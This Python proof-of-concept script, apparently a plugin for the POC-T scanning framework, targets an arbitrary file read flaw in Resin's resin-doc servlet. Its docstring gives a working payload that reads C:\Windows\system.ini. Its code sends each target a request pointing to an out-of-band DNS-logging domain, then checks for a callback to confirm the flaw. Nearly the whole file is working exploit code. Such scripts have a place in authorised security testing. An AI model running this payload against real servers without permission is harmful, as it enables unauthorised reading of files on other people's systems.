#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
resin-doc 任意文件读取漏洞

/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=C:\Windows\system.ini

"""

import requests
from plugin.cloudeye import CloudEye
from plugin.urlparser import iterate_path


def poc(url):
    url = url if '://' in url else 'http://' + url
    print iterate_path(url)
    for each in iterate_path(url):
        try:
            c = CloudEye()
            domain = c.getRandomDomain('resin')
            payload = '/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://%s' % domain
            target = each.rstrip('/') + payload
            requests.get(target, timeout=5)
            if c.verifyDNS(delay=3):
                return each
        except Exception:
            pass
    return False
